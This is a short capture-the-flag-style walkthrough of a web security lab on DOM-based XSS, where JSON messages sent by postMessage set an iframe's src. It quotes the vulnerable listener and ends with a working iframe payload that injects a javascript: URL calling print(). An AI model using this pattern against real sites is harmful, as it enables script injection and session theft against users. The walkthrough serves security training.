Title: DOM XSS using web messages and JSON.parse
Level: Practitioner
Desc: This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.

# Walkthrough:
This function I can see on the we page.
```
 <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```

We want to exploit upper function to make XSS in DOM. We need to get into "load-channel" in case structure, because this case gives access to iframe.src and we can use this to run malicious code.
So we need to forward to this function something like below:
```
window.postMessage(JSON.stringify({
  type: "load-channel",
  url: "https://example.com/player"
}), "*");

```
Complete code payload, which we need to send to the victim is like that:
```
<iframe src=https://0aab005403f0814e809612b000810072.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```
